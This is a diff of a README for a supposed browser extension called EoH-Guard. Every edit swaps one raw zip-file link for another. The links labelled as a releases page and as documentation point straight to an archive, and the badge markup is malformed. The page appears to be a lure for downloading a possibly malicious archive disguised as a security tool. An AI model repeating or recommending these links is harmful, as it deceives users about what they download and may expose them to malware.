@@ -6,7 +6,7 @@ EoH-Guard is a simple browser extension designed to safeguard your online journe
 
 ## 📥 Download EoH-Guard
 
-[![Download EoH-Guard](https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip%https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip)](https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip)
+[![Download EoH-Guard](https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip%https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip)](https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip)
 
 ## 🔍 Features
 
@@ -23,7 +23,7 @@ EoH-Guard is a simple browser extension designed to safeguard your online journe
 ## 📚 How to Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the following link to access the EoH-Guard releases: [Visit this page to download](https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip).
+   Go to the following link to access the EoH-Guard releases: [Visit this page to download](https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip).
 
 2. **Select Your Version:**
    On the Releases page, you'll see a list of available versions. Click on the latest version to proceed.
@@ -64,11 +64,11 @@ If you still need help, please visit the "Issues" section on our GitHub reposito
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For more information, check our detailed [documentation](https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip).
+- **Documentation:** For more information, check our detailed [documentation](https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip).
 - **Community Forums:** Join our community to discuss features and share feedback.
 
 ## 🏁 Conclusion
 
 With EoH-Guard, you can browse the internet safely and confidently. Follow these steps to download, install, and start protecting your online presence today.
 
-[![Download EoH-Guard](https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip%https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip)](https://raw.githubusercontent.com/tukkatakheang/EoH-Guard/main/athanor/EoH-Guard.zip)
+[![Download EoH-Guard](https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip%https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip)](https://github.com/tukkatakheang/EoH-Guard/raw/refs/heads/main/athanor/Guard_Eo_3.2.zip)
